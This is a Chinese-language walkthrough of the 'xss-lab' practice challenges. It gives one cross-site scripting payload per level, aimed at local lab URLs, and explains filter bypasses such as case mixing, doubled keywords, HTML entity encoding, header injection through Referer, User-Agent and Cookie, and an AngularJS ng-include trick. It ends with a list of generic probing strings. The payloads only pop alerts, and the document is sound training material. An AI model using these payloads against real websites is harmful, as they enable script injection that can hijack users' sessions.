# level1

`http://127.0.0.1:1235/xss-lab/level1.php?name=<script>alert(1)</script>`

# level2

`http://127.0.0.1:1235/xss-lab/level2.php?keyword="><script>alert(1)</script><"`

# level3

value处是用单引号闭合的

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240410162421.png)

`'onclick='javascript:alert(1)`

单引号看具体情况加就行

# level4

万能探测语句

`<script>alert(1)</script>`

发现尖括号被替换为空，于是尝试用上一关的方法绕过尖括号。

`"onclick="javascript:alert(1)`

# level5

onclick和script都被过滤了

还可以用`<a></a>`

`"><a href="javascript:alert(1)">`

# level6

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240415153954.png)

大小写绕过

`"><Script>alert(1)</Script>`

# level7

替换为空，所以双写绕过

`"><scrscriptipt>alert(1)</scrscriptipt>`

# level8

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240415160039.png)

一个添加友链的功能，但是添加了过滤。

可以用HTML 实体编码绕过

`r->&#114`

`javasc&#114;ipt:alert(1)`

# level9

输入测试payload：`'';!--"<XSS>=&{()}`

必须包含http://

`javasc&#114ipt:alert('http://')`

# level10

输入测试payload：`'';!--"<XSS>=&{()}`

结果如下：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240415172300.png)

`http://127.0.0.1:1235/xss-lab/level10.php?t_link=&t_history=&t_sort=1"onclick='alert(1)' type="text"`

hidden隐藏的输入框，没什么意思

# level11

输入测试payload发现

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240416161433.png)

双引号被转义，但是referer处不受限制。

所以添加referer：`" type="text" onfocus="javascript:alert(1)`

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240416165730.png)

# level12

同上，改成ua处。

# level13

同上，改成Cookie处

# level14

目标网站好像有点问题，这道题应该做不了了，记录一下做法。

做法是修改图片的EXIF值

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240417150436.png)

最终payload：`'"><img src=1 onerror=alert(document.domain)>'`

# level15

AngularJS的javascript框架漏洞

查看源代码，发现这个网页使用了AngularJS的JavaScript框架，网页源代码：

`<body><span class="ng-include:1.gif"></span></body>`

使用了ng-include这个表达式的意思是当HTML代码过于复杂时，可以将部分代码打包成独立文件，在使用ng-include来引用这个独立的HTML文件。

尝试构造如下payload：

http://10.10.10.135/xss/level15.php?src='level4.php'

竟然在下面出现了level 4的页面！

由于level 4产生XSS的页面是：

http://10.10.10.135/xss/level4.php?keyword="onmouseover='alert(1)'

猜想构造level 5的payload：

http://10.10.10.135/xss/level15.php?src='level4.php?keyword=%22%20onmouseover=alert(1)%20%22'

其中%20为空格的url编码，%22为”的url编码，将鼠标移动到下面的输入框中触发，成功！

# level16

script、空格和/时转译成&nbsp;，&后面的字符被删除。

使用事件属性，用%0a换行符代替空格：

http://192.168.1.104:1235/xss-lab/level16.php?keyword=test%3Cimg%0asrc=1%0aonclick=alert(1)%3E

# level17

http://192.168.1.104:1235/xss-lab/level17.php?arg01=a&arg02=%20onmouseover=alert(1)

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240417155127.png)

不知道为什么加个空格就截断了

# level18

同上

# level19

http://192.168.1.104:1235/xss-lab/level19.php?arg01=version&arg02=%3Ca%20href=%22javascript:alert(1)%22%3Exss%3C/a%3E

# level20

ZeroClipboard 跨站脚本漏洞

# 小结

基础测试语句：

`'';!--"<XSS>=&{()}`



`<script>alert(/1/)</script>`

 

`<img scr=1 onerror="alert(/1/)">`

 

`<img src="javascript:alert('1');">`

 

`<a href="javascript:alert(1)"> `

 

绕过：大小写，编码，双写等等。。。。
